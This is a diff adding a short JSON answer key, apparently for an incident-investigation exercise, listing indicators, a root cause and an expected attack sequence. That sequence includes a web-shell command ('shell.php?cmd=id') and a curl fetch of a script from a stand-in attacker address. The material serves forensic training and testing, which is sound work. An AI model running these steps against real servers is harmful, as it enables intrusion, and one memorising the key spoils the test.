@@ -1,0 +1,6 @@
+{
+  "requiredIndicators": ["198.51.100.23", "203.0.113.9", "shell.php"],
+  "requiredSequence": ["POST /upload", "GET /uploads/shell.php?cmd=id", "curl http://203.0.113.9/p.sh"],
+  "noiseIndicators": ["192.0.2.77"],
+  "rootCause": "Uploaded executable PHP content was served and executed without ownership or content controls"
+}
